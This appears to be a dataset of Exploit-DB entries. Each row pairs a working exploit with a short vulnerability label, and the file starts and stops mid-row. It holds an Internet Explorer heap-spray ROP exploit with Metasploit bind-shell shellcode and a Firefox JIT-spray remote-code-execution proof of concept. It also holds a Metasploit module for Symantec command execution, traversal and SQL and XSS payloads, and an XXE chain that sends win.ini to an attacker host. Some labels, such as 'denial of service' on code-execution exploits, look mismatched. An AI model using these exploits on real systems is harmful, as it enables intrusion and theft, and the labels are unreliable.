rop.toString(16);     var writable1 = rop.substring(4,8);     var writable2 = rop.substring(0,4); // } RET      var rop = cbuttonlayout + 12462; // POP EDI     var rop = rop.toString(16);     var rop13 = rop.substring(4,8);     var rop14 = rop.substring(0,4); // } RET      var rop = cbuttonlayout + 12043; // POP ESI --> changed     var rop = rop.toString(16);     var rop15 = rop.substring(4,8);     var rop16 = rop.substring(0,4); // } RET      var rop = cbuttonlayout + 63776; // JMP EAX     var rop = rop.toString(16);     var jmpeax1 = rop.substring(4,8);     var jmpeax2 = rop.substring(0,4); // } RET      var rop = cbuttonlayout + 85751; // POP EAX     var rop = rop.toString(16);     var rop17 = rop.substring(4,8);     var rop18 = rop.substring(0,4); // } RET      var rop = cbuttonlayout + 4936; // VirtualProtect()     var rop = rop.toString(16);     var vp1 = rop.substring(4,8);     var vp2 = rop.substring(0,4); // } RET      var rop = cbuttonlayout + 454843; // MOV EAX,DWORD PTR DS:[EAX]     var rop = rop.toString(16);     var rop19 = rop.substring(4,8);     var rop20 = rop.substring(0,4); // } RET      var rop = cbuttonlayout + 234657; // PUSHAD     var rop = rop.toString(16);     var rop21 = rop.substring(4,8);     var rop22 = rop.substring(0,4); // } RET       var rop = cbuttonlayout + 408958; // PUSH ESP     var rop = rop.toString(16);     var rop23 = rop.substring(4,8);     var rop24 = rop.substring(0,4); // } RET      var shellcode = unescape(""%u4141%u4141%u4242%u4242%u4343%u4343""); // PADDING     shellcode+= unescape(""%u4141%u4141%u4242%u4242%u4343%u4343""); // PADDING     shellcode+= unescape(""%u4141%u4141""); // PADDING      shellcode+= unescape(""%u""+rop1+""%u""+rop2); // RETN     shellcode+= unescape(""%u""+rop3+""%u""+rop4); // POP EBP # RETN     shellcode+= unescape(""%u""+rop5+""%u""+rop6); // XCHG EAX,ESP # RETN      // Standard DEP bypass     shellcode+= unescape(""%u""+rop3+""%u""+rop4); // POP EBP     shellcode+= unescape(""%u""+rop3+""%u""+rop4); // POP EBP     shellcode+= unescape(""%u""+rop7+""%u""+rop8); // POP EBP     shellcode+= unescape(""%u1024%u0000""); // Size 0x00001024     shellcode+= unescape(""%u""+rop9+""%u""+rop10); // POP EDX     shellcode+= unescape(""%u0040%u0000""); // 0x00000040     shellcode+= unescape(""%u""+rop11+""%u""+rop12); // POP ECX     shellcode+= unescape(""%u""+writable1+""%u""+writable2); // Writable Location     shellcode+= unescape(""%u""+rop13+""%u""+rop14); // POP EDI     shellcode+= unescape(""%u""+rop1+""%u""+rop2); // RET     shellcode+= unescape(""%u""+rop15+""%u""+rop16); // POP ESI     shellcode+= unescape(""%u""+jmpeax1+""%u""+jmpeax2); // JMP EAX     shellcode+= unescape(""%u""+rop17+""%u""+rop18); // POP EAX     shellcode+= unescape(""%u""+vp1+""%u""+vp2); // VirtualProtect()     shellcode+= unescape(""%u""+rop19+""%u""+rop20); // MOV EAX,DWORD PTR DS:[EAX]     shellcode+= unescape(""%u""+rop21+""%u""+rop22); // PUSHAD     shellcode+= unescape(""%u""+rop23+""%u""+rop24); // PUSH ESP     shellcode+= unescape(""%u9090%u9090""); // NOPs     shellcode+= unescape(""%u9090%u9090""); // NOPs     shellcode+= unescape(""%u9090%u9090""); // NOPs      // Bind shellcode on 4444 :)     // msf > generate -t js_le     // windows/shell_bind_tcp - 342 bytes     // http://www.metasploit.com     // VERBOSE=false, LPORT=4444, RHOST=, PrependMigrate=false,     // EXITFUNC=process, InitialAutoRunScript=, AutoRunScript=     // I would keep the shellcode the same size for better reliability :) also would stay away from meterpreter/reverse_tcp     // You can also generate as follows: msfpayload windows/meterpreter/reverse_https LHOST=192.168.12.13 LPORT=443 R | msfencode -a x86 -t js_le      shellcode+= unescape(""%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b"" +                              ""%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a"" +                              ""%uff31%uc031%u3cac%u7c61%u2c02%uc120%u0dcf"" +                              ""%uc701%uf0e2%u5752%u528b%u8b10%u3c42%ud001"" +                              ""%u408b%u8578%u74c0%u014a%u50d0%u488b%u8b18"" +                              ""%u2058%ud301%u3ce3%u8b49%u8b34%ud601%uff31"" +                              ""%uc031%uc1ac%u0dcf%uc701%ue038%uf475%u7d03"" +                              ""%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66"" +                              ""%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489"" +                              ""%u2424%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a"" +                              ""%ueb12%u5d86%u3368%u0032%u6800%u7377%u5f32"" +                              ""%u6854%u774c%u0726%ud5ff%u90b8%u0001%u2900"" +                              ""%u54c4%u6850%u8029%u006b%ud5ff%u5050%u5050"" +                              ""%u5040%u5040%uea68%udf0f%uffe0%u89d5%u31c7"" +                              ""%u53db%u0268%u1100%u895c%u6ae6%u5610%u6857"" +                              ""%udbc2%u6737%ud5ff%u5753%ub768%u38e9%uffff"" +                              ""%u53d5%u5753%u7468%u3bec%uffe1%u57d5%uc789"" +                              ""%u7568%u4d6e%uff61%u68d5%u6d63%u0064%ue389"" +                              ""%u5757%u3157%u6af6%u5912%ue256%u66fd%u44c7"" +                              ""%u3c24%u0101%u448d%u1024%u00c6%u5444%u5650"" +                              ""%u5656%u5646%u564e%u5356%u6856%ucc79%u863f"" +                              ""%ud5ff%ue089%u564e%uff46%u6830%u8708%u601d"" +                              ""%ud5ff%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff"" +                              ""%u063c%u0a7c%ufb80%u75e0%ubb05%u1347%u6f72"" +                              ""%u006a%uff53%u41d5"");      // Total spray should be 1000     var padding = unescape(""%u9090"");     while (padding.length < 1000)         padding = padding + padding;     var padding = padding.substr(0, 1000 - shellcode.length);      shellcode+= padding;      while (shellcode.length < 100000)         shellcode = shellcode + shellcode;      var onemeg = shellcode.substr(0, 64*1024/2);      for (i=0; i<14; i++) {         onemeg += shellcode.substr(0, 64*1024/2);     }      onemeg += shellcode.substr(0, (64*1024/2)-(38/2));      var spray = new Array();      for (i=0; i<100; i++) {         spray[i] = onemeg.substr(0, onemeg.length);     } }  function leak(){         var leak_col = document.getElementById(""132"");         leak_col.width = ""41"";         leak_col.span = ""19""; }  function get_leak() {         var str_addr = strtoint(bl[498].substring((0x100-6)/2+11,(0x100-6)/2+13));         str_addr = str_addr - 1410704;         var hex = str_addr.toString(16);         //alert(hex);         setTimeout(function(){heapspray(str_addr)}, 50); }  function trigger_overflow(){         var evil_col = document.getElementById(""132"");         evil_col.width = ""1245880"";         evil_col.span = ""44""; }  setTimeout(function(){leak()}, 400); setTimeout(function(){get_leak()},450); setTimeout(function(){trigger_overflow()}, 700);  </script> </body> </html>",denial of service,1
22542,"Alt-N WebAdmin 2.0.x - Remote File Disclosure source: https://www.securityfocus.com/bid/7439/info  Reportedly, remote users can discover the installation directory of certain software on the underlying system by submitting an HTTP request to the WebAdmin server. This could allow an attacker to obtain sensitive information.  http://www.example.com/WebAdmin.dll?session=X&Program=MDaemon&Directory:Name=C:\MDaemon\App&File:Name=MDAEMON.INI&View=EditFile",discover the installation directory of certain software on the underlying system,1
20461,"Cat Soft Serv-U FTP Server 2.4/2.5 - FTP Directory Traversal source: https://www.securityfocus.com/bid/2052/info  FTP Serv-U is an internet FTP server from CatSoft.  Authenticated users can gain access to the ftproot of the drive where Serv-U FTP has been installed. Users that have read, write, execute and list access in the home directory will have the same permissions to any file which resides on the same partition as the ftproot, once a user is in the home directory they can successfully transfer any files using specially crafted GET requests. All hidden files will be revealed even if the 'Hide hidden files' feature is on.  Successful exploitation of this vulnerability could enable a remote user to gain access to systems files, password files, etc. This could lead to a complete compromise of the host.   ftp> cd \..%20. 250 Directory changed to /..  ftp> cd %20..%20%20../winnt 250 Directory changed to /c:/TOMB/../WINNT ftp> put autoexec.bat %20..%20%20../winnt/2.bat 200 PORT Command successful. 150 Opening ASCII mode data connection for 2.bat. 226 Transfer complete. ftp> dir \..%20.\..%20.\winnt\",transfer any files using specially crafted GET requests. All hidden files will be revealed even if the 'Hide hidden files' feature is on,1
18660,"RIPS 0.53 - Multiple Local File Inclusions # RIPS <= 0.53 Multiple Local File Inclusion Vulnerabilities # Google Dork: allintitle: ""RIPS - A static source code analyser for vulnerabilities in PHP scripts"" # Althout this script is not intended to be accesible from internet, there are some websites that host it. # Download: http://sourceforge.net/projects/rips-scanner/ # Date: 23/03/12 # Contact: mattdch0@gmail.com # Follow: @mattdch # www.localh0t.com.ar   File: /windows/code.php =======================  102: file $lines = file($file);     96: $file = $_GET['file'];  PoC: http://localhost/rips/windows/code.php?file=../../../../../../etc/passwd  File: /windows/function.php ===========================      64: file $lines = file($file);         58: $file = $_GET['file'];  PoC: http://localhost/rips/windows/function.php?file=../../../../../../etc/passwd(will read the first line of the file)",code execution,1
44294,"Firefox 44.0.2 - ASM.JS JIT-Spray Remote Code Execution <!DOCTYPE HTML>  <!--      FULL ASLR AND DEP BYPASS USING ASM.JS JIT SPRAY (CVE-2017-5375)     *PoC* Exploit against Firefox 44.0.2 (CVE-2016-1960)     ASM.JS float constant pool JIT-Spray special shown at OffensiveCon 2018      Tested on:     Firefox 44.0.2 32-bit - Windows 10 1709     https://ftp.mozilla.org/pub/firefox/releases/44.0.2/win32/en-US/Firefox%20Setup%2044.0.2.exe      Howto:     1) serve PoC over network and open it in Firefox 44.0.2 32-bit     2) A successfull exploit attempt should pop calc.exe      Mozilla Bug Report:     https://bugzilla.mozilla.org/show_bug.cgi?id=1246014       Writeup:      https://rh0dev.github.io/blog/2018/more-on-asm-dot-js-payloads-and-exploitation/       - For research purposes only -          (C) Rh0      Mar. 13, 2018      Notes:     *) very similar to CVE-2016-2819, but still different:     *) this PoC (CVE-2016-1960) does trigger in 44.0.2 but not in 46.0.1        because in 46.0.1 it is already fixed.     *) CVE-2016-2819 does trigger the same bug in 44.0.2 and 46.0.1 because it        was fixed in Firefox > 46.0.1  -->  <title>CVE-2016-1960 and ASM.JS JIT-Spray</title> <head> <meta charset=UTF-8 /> <script> ""use strict""  var Exploit = function(){     this.asmjs = new Asmjs()     this.heap = new Heap() }  Exploit.prototype.go = function(){     /* target address of fake node object */     var node_target_addr = 0x20200000       /* target address of asm.js float pool payload*/     var target_eip = 0x3c3c1dc8      /* spray fake Node objects */     this.heap.spray(node_target_addr, target_eip)      /* spray asm.js float constant pools */     this.asmjs.spray_float_payload(0x1800)      /* go! */     this.trigger_vuln(node_target_addr) };   Exploit.prototype.trigger_vuln = function(node_ptr){     document.body.innerHTML = '<table><svg><div id=""AAAA"">'     this.heap.gc()     var a = new Array()      for (var i=0; i < 0x11000; i++){         /* array element (Node object ptr) control with integer underflow */         a[i] = new Uint32Array(0x100/4)         for (var j=0; j<0x100/4; j++)             a[i][j] = node_ptr      }      /* original crashing testcase     document.getElementById('AAAA').innerHTML = '<title><template><td><tr><title><i></tr><style>td</style>';     */      /* easier to exploit codepath */     document.getElementById('AAAA').innerHTML = '<title><template><td><tr><title><i></tr><style>td<DD>';      window.location.reload() };   var Asmjs = function(){};  Asmjs.prototype.asm_js_module = function(stdlib, ffi){     ""use asm""     var foo = ffi.foo     function payload(){         var val = 0.0         /* Fx 44.0.2 float constant pool of size 0xc0 is at 0xXXXX1dc8*/         val = +foo(             // $ msfvenom --payload windows/exec CMD=calc.exe # transformed with sc2asmjs.py             -1.587865768352248e-263,             -8.692422460804815e-255,             7.529882109376901e-114,             2.0120602207293977e-16,             3.7204662687249914e-242,             4.351158092040946e+89,             2.284741716118451e+270,             7.620699014501263e-153,             5.996021286047645e+44,             -5.981935902612295e-92,             6.23540918304361e+259,             1.9227873281657598e+256,             2.0672493951546363e+187,             -6.971032919585734e+91,             5.651413300798281e-134,             -1.9040061366251406e+305,             -1.2687640718807038e-241,             9.697849844423e-310,             -2.0571400761625145e+306,             -1.1777948610587587e-123,             2.708909852013898e+289,             3.591750823735296e+37,             -1.7960516725035723e+106,             6.326776523166028e+180         )         return +val;     }     return payload };  Asmjs.prototype.spray_float_payload = function(regions){     this.modules = new Array(regions).fill(null).map(         region => this.asm_js_module(window, {foo: () => 0})     ) };  var Heap = function(target_addr, eip){     this.node_heap = [] };   Heap.prototype.spray = function(node_target_addr, target_eip){     var junk = 0x13371337     var current_address = 0x08000000     var block_size = 0x1000000     while(current_address < node_target_addr){         var fake_objects = new Uint32Array(block_size/4 - 0x100)         for (var offset = 0; offset < block_size; offset += 0x100000){             /* target Node object needed to control EIP  */             fake_objects[offset/4 + 0x00/4] = 0x29              fake_objects[offset/4 + 0x0c/4] = 3             fake_objects[offset/4 + 0x14/4] = node_target_addr + 0x18             fake_objects[offset/4 + 0x18/4] = 1             fake_objects[offset/4 + 0x1c/4] = junk             fake_objects[offset/4 + 0x20/4] = node_target_addr + 0x24             fake_objects[offset/4 + 0x24/4] = node_target_addr + 0x28             fake_objects[offset/4 + 0x28/4] = node_target_addr + 0x2c             fake_objects[offset/4 + 0x2c/4] = target_eip          }         this.node_heap.push(fake_objects)         current_address += block_size     } };  Heap.prototype.gc = function(){     for (var i=0; i<=10; i++)         var x = new ArrayBuffer(0x1000000) };  </script> <head> <body onload='exploit = new Exploit(); exploit.go()' />",denial of service,1
14610,Microsoft Windows - Tracing Registry Key ACL Privilege Escalation source: https://www.securityfocus.com/bid/42269/info  Microsoft Windows is prone to a local privilege-escalation vulnerability.  An attacker can exploit this issue to execute arbitrary code with SYSTEM-level privileges. Successful exploits will result in the complete compromise of affected computers.   Code: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/14610.zip (Chimichurri-CVE-2010-2554.zip),privilege-escalation,1
31364,F5 BIG-IP 9.4.3 - Web Management Interface Console HTML Injection source: https://www.securityfocus.com/bid/28151/info  F5 BIG-IP Web Management Interface is prone to a HTML-injection vulnerability because the web management interface fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected device. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  The vulnerability affects F5 BIG-IP 9.4.3; other versions may be also affected.  https://(target)/dms/policy/rep_request.php?report_type=%22%3E%3Cbody+onload=alert(%26quot%3BXSS%26quot%3B)%3E%3Cfoo+,execute arbitrary script code in the browser of an unsuspecting user in the context of the affected device,1
27736,"Invision Power Board 2.0/2.1 - 'index.php?CK' SQL Injection source: https://www.securityfocus.com/bid/17690/info  Invision Power Board is prone to an SQL-injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.   Successful exploitation could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.  http://www.example.com/index.php?act=task&ck=&#039;","compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation",1
28989,"INFINICART - 'search.asp?search' Cross-Site Scripting source: https://www.securityfocus.com/bid/21043/info  Infinicart is prone to multiple input-validation vulnerabilities, including HTML-injection and SQL-injection issues, because the application fails to properly sanitize user-supplied input.  A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, or even exploit vulnerabilities in the underlying database implementation. Other attacks are also possible.  The vendor reports that these issues affect only the demonstration version of Infinicart and do not affect any official released versions of the application.  in /infinicart-demo/search.asp : post the following search = &lt;/textarea&gt;&#039;""><script>alert(document.cookie)</script>",the application fails to properly sanitize user-supplied input,1
31917,"Symantec Endpoint Protection Manager - Remote Command Execution (Metasploit) ## # This module requires Metasploit: http//metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core' require 'msf/core/exploit/powershell'  class Metasploit3 < Msf::Exploit::Remote   Rank = ExcellentRanking    include REXML   include Msf::Exploit::CmdStagerVBS   include Msf::Exploit::Remote::HttpClient    def initialize(info = {})     super(update_info(info,       'Name'           => 'Symantec Endpoint Protection Manager Remote Command Execution',       'Description'    => %q{         This module exploits XXE and SQL injection flaws in Symantec Endpoint Protection Manager         versions 11.0, 12.0 and 12.1. When supplying a specially crafted XXE request an attacker         can reach SQL injection affected components. As xp_cmdshell is enabled in the included         database instance, it's possible to execute arbitrary system commands on the remote system         with SYSTEM privileges.       },       'Author'         =>         [           'Stefan Viehbock', # Discovery           'Chris Graham', # PoC exploit           'xistence <xistence[at]0x90.nl>' # Metasploit module         ],       'License'        => MSF_LICENSE,       'References'     =>         [           [ 'CVE', '2013-5014' ],           [ 'CVE', '2013-5015' ],           [ 'EDB', '31853'],           [ 'URL', 'https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20140218-0_Symantec_Endpoint_Protection_Multiple_critical_vulnerabilities_wo_poc_v10.txt' ]         ],       'Arch'           => ARCH_X86,       'Platform'       => 'win',       'Targets'        =>         [           ['Windows VBS Stager', {}]         ],       'Privileged'     => true,       'DisclosureDate' => 'Feb 24 2014',       'DefaultTarget'  => 0))      register_options(       [         Opt::RPORT(9090),         OptString.new('TARGETURI', [true, 'The base path', '/'])       ], self.class)   end    def check     res = send_request_cgi(       {         'uri'   =>  normalize_uri(target_uri.path),         'method' => 'GET',       })      if res && res.code == 200 && res.body =~ /Symantec Endpoint Protection Manager/ && res.body =~ /1995 - 2013 Symantec Corporation/       return Exploit::CheckCode::Appears     end      Exploit::CheckCode::Safe   end    def exploit     print_status(""#{peer} - Sending payload"")     # Execute the cmdstager, max length of the commands is ~3950     execute_cmdstager({:linemax => 3950})   end    def execute_command(cmd, opts = {})     # Convert the command data to hex, so we can use that in the xp_cmdshell. Else characters like '>' will be harder to bypass in the XML.     command = ""0x#{Rex::Text.to_hex(""cmd /c #{cmd}"", '')}""      # Generate random 'xx032xxxx' sequence number.     seqnum = ""#{rand_text_numeric(2)}032#{rand_text_numeric(4)}""      soap = soap_request(seqnum, command)      post_data = Rex::MIME::Message.new     post_data.add_part(soap, ""text/xml"", nil, ""form-data; name=\""Content\"""")     xxe = post_data.to_s      res = send_request_cgi(       {         'uri' => normalize_uri(target_uri.path, 'servlet', 'ConsoleServlet'),         'method' => 'POST',         'vars_get' => { 'ActionType' => 'ConsoleLog' },         'ctype'  => ""multipart/form-data; boundary=#{post_data.bound}"",         'data' => xxe,       })      if res and res.body !~ /ResponseCode/       fail_with(Failure::Unknown, ""#{peer} - Something went wrong."")     end   end    def soap_request(seqnum, command)     randpayload = rand_text_alpha(8+rand(8))     randxxe = rand_text_alpha(8+rand(8))     entity = ""<!ENTITY #{randpayload} SYSTEM \""http://127.0.0.1:9090/servlet/ConsoleServlet?""     entity << ""ActionType=ConfigServer&action=test_av&SequenceNum=#{seqnum}&Parameter=';call xp_cmdshell(#{command});--\"" >""      xml = Document.new     xml.add(DocType.new('sepm', ""[ METASPLOIT ]""))     xml.add_element(""Request"")     xxe = xml.root.add_element(randxxe)     xxe.text = ""PAYLOAD""      xml_s = xml.to_s     xml_s.gsub!(/METASPLOIT/, entity) # To avoid html encoding     xml_s.gsub!(/PAYLOAD/, ""&#{randpayload};"") # To avoid html encoding      xml_s   end  end",execute arbitrary system commands on the remote system with SYSTEM privileges,1
40843,"Microsoft Internet Explorer 11 - MSHTML 'CGenerated­Content::Has­Generated­SVGMarker' Type Confusion <!-- Source: http://blog.skylined.nl/20161124001.html  Synopsis  A specially crafted web-page can cause a type confusion in HTML layout in Microsoft Internet Explorer 11. An attacker might be able to exploit this issue to execute arbitrary code.  Known affected software and attack vectors  Microsoft Internet Explorer 11  An attacker would need to get a target user to open a specially crafted web-page. Disabling Javascript should prevent an attacker from triggering the vulnerable code path.  Repro.html: -->  <html>   <head>     <meta http-equiv=""X-UA-Compatible"" content=""IE=Edge"" />     <script>       window.onload = function () {         document.get­Elements­By­Tag­Name(""iframe"")[0].src = ""repro-iframe.html"";       }     </script>   </head>   <body>     <iframe></iframe>   </body> </html>  <!--  Repro-iframe.html:  <svg><path marker-start=""url(#)""><title><q><button>  Description  Internally MSIE uses various lists of linked CTree­Pos objects to represent the DOM tree. For HTML/SVG elements a CTree­Node element is created, which embeds two CTree­Pos instances: one that contains information about the first child of the element and one that indicates the next sibling or parent of the element. For text nodes an object containing only one CTree­Pos is created, as such nodes never have any children. CTree­Pos instances have various flags set. This includes a flag that indicates if they are the first (f­TPBegin) or second (f­TPEnd) CTree­Pos instance for an element, or the only instance for a test node (f­TPText).  The CTree­Pos::Branch method of an CTree­Pos instance embedded in a CTree­Node can be used to calculate a pointer to the CTree­Node. It determines if the CTree­Pos instance is the first or second in the CTree­Node by looking at the f­TPBegin flag and subtract the offset of this CTree­Pos object in a CTree­Node object to calculate the address of the later. This method assumes that the CTree­Pos instance is part of a CTree­Node and not a Text­Node. It will yield invalid results when called on the later. In a Text­Node, the CTree­Pos does not have the f­TPBegin flag set, so the code assumes this is the second CTree­Pos instance in a CTree­Node object and subtracts 0x24 from its address to calculate the address of the CTree­Node. Since the CTree­Pos instance is the first element in a Text­Node, the returned address will be 0x24 bytes before the Text­Node, pointing to memory that is not part of the object.  Note that this behavior is very similar to another issue I found around the same time, in that that issues also caused the code to access memory 0x24 bytes before the start of a memory region containing an object. Looking back I believe that both issues may have had the same root cause and were fixed at the same time.  The CGenerated­Content::Has­Generated­SVGMarker method walks the DOM using one of the CTree­Pos linked lists. It looks for any descendant node of an element that has a CTree­Pos instance with a specific flag set. If found, the CTree­Pos::Branch method is called to find the related CTree­Node, without checking if the CTree­Pos is indeed part of a CTree­Node. If a certain flag is set on this CTree­Node, it returns true. Otherwise it continues scanning. If nothing is found, it returns false.  The repro creates a situation where the CGenerated­Content::Has­Generated­SVGMarker method is called on an SVG path element which has a Text­Node instance as a descendant with the right flags set to cause it to call CTree­Pos::Branch on this Text­Node. This leads to type confusion/a bad cast where a pointer that points before a Text­Node is used as a pointer to a CTree­Node.  Reversed code  While reversing the relevant parts, I created the following pseudo-code to illustrate the issue:  enum e­Tree­Pos­Flags {   f­TPBegin =           0x01, // if set, this is a markup node   f­TPEnd =             0x02, // if set, this is a markup node   f­TPText =            0x04, // if set, this is a markup node   f­TPPointer =         0x08, // if set, this is not a markup node   f­TPType­Mask =        0x0f   f­TPLeft­Child =       0x10,   f­TPLast­Child =       0x20, // po­Next­Sibling­Or­Parent => f­TPLast­Child ? parent : sibling   f­TPData2Pos =        0x40, // valid if f­TPPointer is set   f­TPData­Pos =         0x80,   f­TPUnknown­Flag100 = 0x100, // if set, this is not a markup node } struct CTree­Pos {   /*offs size*/                                             // THE BELOW ARE BEST GUESSES BASED ON INADEQUATE INFORMATION!!   /*0000 0004*/ e­Tree­Pos­Type  f­Flags00;                        /*0004 0004*/ UINT          u­Chars­Count04;                // Seems to be counting some chars - not sure what exactly   /*0008 0004*/ CTree­Pos*     po­First­Child;                 // can be NULL if no children exist.   /*000C 0004*/ CTree­Pos*     po­Next­Sibling­Or­Parent;        // f­Flags00 & f­TPLast­Child ? parent end tag : sibling start tag   /*0010 0004*/ CTree­Pos*     po­Thread­Left10;               // f­Flags00 & f­TPBegin ? previous sibling or parent : last child or start tag   /*0014 0004*/ CTree­Pos*     po­Thread­Right14;              // f­Flags00 & f­TPBegin ? first child or end tag :                                                                 /*0018 0004*/ flags  (0x10 = something with CDATA            /*0028 0004*/                                              }                                                             struct CTree­Node {   /*offs size*/                                             // THE BELOW ARE BEST GUESSES BASED ON INADEQUATE INFORMATION!!   /*0000 0004*/ CElement*     po­Element00;                     /*0004 0004*/ CTree­Node*    po­Parent04;                      /*0008 0004*/ DWORD         dw­Unknown08;                  // flags?   /*000C 0018*/ CTree­Pos      o­Tree­Pos­Begin0C;              // represents the position in the document immediately before the start tag   /*0024 0018*/ CTree­Pos      o­Tree­Pos­End24;                // represents the position in the document immediately after the end tag   /*003C ????*/ Unknown } struct Text­Node { // I did not figure out what this is called in MSIE   /*0000 0018*/ CTree­Pos      o­Tree­Pos­End00;                // represents the position in the document immediately after the node.   /*0018 0014*/ Unknown }  CTree­Node* CTree­Pos::Branch() {   // Given a pointer to a CTree­Pos instance in a CTree­Node instance, calculate a pointer to the CTree­Node instance.   // The CTree­Pos instance must be either the o­Tree­Pos­Begin0C (o­Tree­Pos­Begin0C->f­Flags00 & f­TPBegin != 0) or the   // o­Tree­Pos­End24 (o­Tree­Pos­End24->f­Flags00 & f­TPEnd != 0).   BOOL b­Is­Tree­Pos­Begin0C = this->f­Flags00 & f­TPBegin;   INT u­Offset = offsetof(CTree­Node, b­Is­Tree­Pos­Begin0C ? o­Tree­Pos­Begin0C : o­Tree­Pos­End24);   return (CTree­Node*)((BYTE*)this - u­Offset); }  BOOL CGenerated­Content::Has­Generated­SVGMarker() {   for (     CTree­Pos* po­Current­Tree­Pos = this->o­Tree­Pos­Begin0C.po­Thread­Right14,       CTree­Pos* po­End­Tree­Pos = &(this->o­Tree­Pos­End24);     po­Current­Tree­Pos != po­End­Tree­Pos;     po­Current­Tree­Pos = po­Current­Tree­Pos->po­Thread­Right14   ) {     if (po­Current­Tree­Pos->f­Flags00 & f­TPUnknown­Flag100) {       // Calling Branch is only valid in the context of CTree­Pos embedded in a CTree­Node, so the code should check for       // the presence of f­TPBegin or f­TPEnd in f­Flags00 before doing so. This line of code may fix the issue:       // if (po­Current­Tree­Pos->f­Flags00 & (f­TPBegin | f­TPEnd) == 0) continue;       CTree­Node* po­Tree­Node = po­Current­Tree­Pos->Branch();       if (po­Tree­Node && po­Tree­Node->dw64 == 20) {           return 1       }     }   }   return 0 }   DOM Tree  If you replace the <q> tag with an <a> tag in the repro, or insert a <script> tag before the <svg> tag, the repro does not trigger an access violation. At that point it is possible to use document.document­Element.outer­HTML as well as recursively walk document.document­Element.child­Nodes to get an idea of what the DOM tree looks like around the time of the crash.  document.document­Element.outer­HTML:  <html>   <head>   </head>   <body>     <svg xmlns=""http://www.w3.org/2000/svg"">       <path marker-start=""url(""#"")"">         <title>           <q>             <button>                    // no closing tag.             <script>                    // script is a sibling of button               #text                     // snipped             </script>           </q>         </title>                        // Things get really weird here:         </title>       </path>                           // all svg close tags are doubled!?       </path>     </svg>                              // Not sure what this means.     </svg>   </body> </html>   Walking document.document­Element.child­Nodes:  <html>   <head>   <body>     <svg>                               // I did not look at attributes       <path>                            // ^^^ same here         <title>           <q>             <button>               <script>                  // script is a child of button                 #text                   // snipped  Exploit  I did not find any code path that could lead to exploitation. However, I did not do a thorough step through of the code to find out if and how I might control execution flow upwards in the stack. Also, it appears trivial to have MSIE survive the initial crash by massaging the heap. It might be possible that other methods are affected by a similar issue and that further DOM manipulations can be used to trigger a more interesting code path.  Time-line  July 2014: This vulnerability was found through fuzzing. September 2014: This vulnerability was submitted to ZDI. September 2014: This vulnerability appears to have been fixed. October 2014: This vulnerability was rejected by ZDI. November 2016: Details of this issue are released. -->",execute arbitrary code,1
21234,"Netopia Timbuktu Pro for Macintosh 6.0.1 - Denial of Service source: https://www.securityfocus.com/bid/3918/info  Timbuktu is a remote administration tool. It is available for the Microsoft Window's family of operating systems and Power PC based Macintosh computers. It supports a variety of administrative tasks, including full remote access to the user's desktop.  A vulnerability exists in some versions of Timbuktu. If a large number of connections are created to the Timbuktu server, the server will no longer accept new connections.   #!/bin/sh while: do telnet tb2.host.com 1417 & done",no longer accept new connections,1
44493,"Geist WatchDog Console 3.2.2 - Multiple Vulnerabilities # Exploit Author: bzyo # CVE: CVE-2018-10077, CVE-2018-10078, CVE-2018-10079 # Twitter: @bzyo_ # Exploit Title: Geist WatchDog Console 3.2.2 -  Multiple Vulnerabilities # Date: 04-17-18 # Vulnerable Software: WatchDog Console - 3.2.2 # Vendor Homepage: http://www.itwatchdogs.com/ # Version: 3.2.2 # Software Link: http://www.itwatchdogs.com/userfiles/file/firmware/Console/WatchDogConsoleInstaller_v3.2.2.exe # Tested On: Windows 7 x86   Description ----------------------------------------------------------------- WatchDog Console suffers from multiple vulnerabilities:  # CVE-2018-10077 Authenticated XML External Entity (XXE) # CVE-2018-10078 Authenticated Stored Cross Site Scripting (XSS) # CVE-2018-10079 Insecure File Permissions  Prerequisites ----------------------------------------------------------------- To successfully exploit these vulnerabilities, an attacker must already have access  to a system running WatchDog Console using a low-privileged user account  Proof of Concepts ----------------------------------------------------------------- ### CVE-2018-10079 Insecure File Permissions ### By default, WatchDog Console 3.2.2 installs all configuration data at 'C:\ProgramData\WatchDog Console' and  gives 'Authenticated Users' group Modify permissions   C:\>icacls ""c:\ProgramData\WatchDog Console"" c:\ProgramData\WatchDog Console NT AUTHORITY\Authenticated Users:(OI)(CI)(M,DC)  This allows any local user of the system the ability to reset the application admin password by generating  a password using the PHP md5() function and updating the config.xml file.  It also provides the ability to  add data to servers.xml for both CVE-2018-10078 and CVE-2018-10079 or through the application interface  ### CVE-2018-10077 Authenticated XML External Entity (XXE) ### With authenticated admin access to the application or local access to the system, a user has the ability to read  system files remotely through XXE  On attacking machine - Create data.xml with following contents in apache root and start apache listening on 80 	<?xml version=""1.0"" encoding=""utf-8""?> 	<!DOCTYPE r [ 	<!ELEMENT r ANY > 	<!ENTITY % sp SYSTEM ""http://192.168.0.149:8080/evil.xml""> 	%sp; 	%param1; 	]> 	<r>&exfil;</r>  - Create evil.xml with the following contents anywhere 	<?xml version=""1.0"" encoding=""UTF-8""?> 	<!ENTITY % data SYSTEM ""file:///c:/windows/win.ini""> 	<!ENTITY % param1 ""<!ENTITY exfil SYSTEM 'http://192.168.0.149:8080/?%data;'>""> 	 - Start python simple http server in same directory as evil.xml, listening on 8080 	python -m SimpleHTTPServer 8080 	 On victim machine (1 of 2 ways) 1. With admin access to application console, add attacking server IP address under servers tab or 2. With local access to system 	- update 'C:\ProgramData\WatchDog Console\servers.xml file' with following: 		<?xml version=""1.0"" encoding=""utf-8"" standalone=""yes""?> 		<servers> 		<server host=""192.168.0.149"" addrType=""http"" port=""80"" description="""" selEmail=""True"" Username=""1"" Password=""1"" left=""700"" top=""420"" /> 		</servers> 	- restart system  On attacking machine - Contents of 'win.ini' is outputted to console - 